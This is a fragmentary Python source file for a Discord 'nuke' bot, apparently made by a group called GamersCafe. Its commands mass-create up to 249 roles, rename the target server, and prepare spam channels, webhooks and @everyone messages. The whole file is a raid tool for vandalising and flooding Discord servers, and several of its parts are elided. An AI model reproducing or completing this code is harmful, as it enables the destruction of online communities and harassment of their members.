...
CHANNEL_NAMES = ['gc wizzed you']
MESSAGE_CONTENTS = [" gc ran you @everyone"]
WEBHOOK_NAMES = ["gcop tera baap hai"]
...
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "MADE BY GAMERSCAFE"))
...
async def roles(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"GC ON TOP")
      print("Created Roles")
    except:
...
async def wizz(ctx, amount=50):
  await ctx.guild.edit(name="GCONTOP")
...
async def help(ctx, *args):
    ...
    embed.set_footer(text=f'RG NUKE BOT OP')
